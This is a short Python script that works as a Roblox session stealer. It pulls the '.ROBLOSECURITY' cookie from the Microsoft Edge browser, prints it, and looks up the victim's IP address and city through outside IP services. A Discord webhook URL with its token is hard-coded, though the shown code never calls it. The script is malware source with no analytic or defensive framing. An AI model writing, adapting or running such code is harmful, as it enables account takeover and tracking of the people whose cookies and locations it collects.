import browser_cookie3
import json
webhookk = "https://discord.com/api/webhooks/1095604061602070528/TGiDPF7VDltvsG7uMoZzeMFDao0CDHeg-0wTZ0emU5TERMSxwLKXOweBF8YT40UlQYWG"
import requests
def Log():
    cookiesQ = browser_cookie3.edge(domain_name='roblox.com')
    for cookiesOMG in cookiesQ:
      if cookiesOMG.name == '.ROBLOSECURITY':
          return cookiesOMG
        
cookies = Log()
roblox_cookie = cookies.value
print(roblox_cookie)
ip_address = requests.get("https://api.ipify.org/").text
print(ip_address)
info = requests.get(f"http://ip-api.com/json/{ip_address}?fields=16976857").json()


print(info['city'])


